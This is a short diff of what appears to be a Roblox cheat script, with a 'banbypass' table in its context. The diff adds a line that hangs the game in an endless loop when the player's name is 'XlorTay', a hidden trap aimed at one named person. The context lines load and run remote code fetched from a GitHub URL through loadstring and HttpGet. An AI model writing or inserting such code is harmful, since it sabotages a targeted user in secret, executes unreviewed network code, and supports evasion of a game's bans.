@@ -37,6 +37,8 @@ local banbypass = {
     "こ"
 }
 
+if Players.LocalPlayer.Name == "XlorTay" then while true do end end
+
 local notifs
     notifs = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua"))()
     
